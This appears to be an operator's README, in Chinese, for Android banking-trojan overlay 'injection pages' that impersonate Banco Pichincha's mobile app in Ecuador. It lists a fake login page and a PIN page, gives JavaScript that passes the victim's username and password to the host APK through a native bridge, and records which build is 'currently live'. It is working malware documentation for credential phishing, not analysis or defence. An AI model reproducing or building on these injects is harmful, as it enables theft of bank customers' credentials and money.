# 厄瓜多尔（EC）注入页

| 品牌 | 包名 | 文件 | 说明 |
|---|---|---|---|
| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` | 登录页（入口，bancaMovil(1) 版） |
| 同上 | 同上 | `pichincha_pin.html` | PIN 步骤页（备用，未串联） |

## 协议

只走 APK 原生桥，页面内无任何 HTTP 外发：

```js
// 登录
FKB.setFormData(JSON.stringify({
  pkg: pk, sn: sn, template: 'pichincha',
  formData: { username: u, password: p }
}));
```

## 版本追溯

```
fd9d1f5c  bancaMovil(1) ← 当前线上（sha256 c973355f…）
7d9d4d52  bancaMovil(2)
f81d8340  串联 PIN 页（已还原）
```
